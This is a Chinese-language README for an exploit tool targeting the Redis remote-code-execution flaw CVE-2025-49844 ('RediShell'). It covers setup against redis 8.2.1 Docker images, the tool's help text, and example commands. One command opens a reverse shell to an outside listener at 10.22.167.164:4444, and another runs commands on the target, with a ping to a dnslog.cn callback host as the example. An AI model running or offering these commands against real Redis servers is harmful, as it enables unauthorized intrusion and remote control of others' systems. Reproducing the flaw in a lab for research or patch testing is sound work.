# redis-cve-2025-49844
redis_rce

支持这两个版本
- x86-64 Linux `redis:8.2.1-alpine` Docker image
- x86-64 Linux `redis:8.2.1-bookworm` Docker image

1.复现环境
```
镜像拉取
docker run -d -p 6379:6379 redis:8.2.1-alpine
```
2.利用
```
cd cve-2025-49844
同步依赖
uv sync
```
3.工具使用帮助
uv run cve-2025-49844 -h
```
CVE-2025-49844 (RediShell) Exploit
positional arguments:
  {command,rshell}
    command             Execute one-way shell command
    rshell              Get reverse shell

options:
  -h, --help            show this help message and exit
  --target-host TARGET_HOST
                        Redis target host (default: 127.0.0.1)
  --target-port TARGET_PORT
                        Redis target port (default: 6379)
  --password PASSWORD   Redis AUTH password (if required)
```


- 反弹命令执行
```
uv run cve-2025-49844 --target-host 192.168.41.128 --target-port 6379 rshell -l 10.22.167.164 -p 4444
```
<img width="1080" height="233" alt="屏幕截图 2025-12-25 183037" src="https://github.com/user-attachments/assets/fbf6adbe-04b0-45be-bd72-80a7ae22d339" />

<img width="516" height="164" alt="屏幕截图 2025-12-25 183055" src="https://github.com/user-attachments/assets/d9973e7f-0d50-489f-bd24-8e37597cb77a" />

- 单命令执行
```
uv run cve-2025-49844  --target-host 192.168.41.128 --target-port 6379 command "ping qanctw.dnslog.cn"
```
<img width="1114" height="245" alt="屏幕截图 2025-12-25 175214" src="https://github.com/user-attachments/assets/32f800e3-40e3-485f-8808-2f4d8d8e12e3" />

<img width="818" height="266" alt="屏幕截图 2025-12-25 175223" src="https://github.com/user-attachments/assets/147c22ef-aa33-44de-9fac-75b70329bd11" />





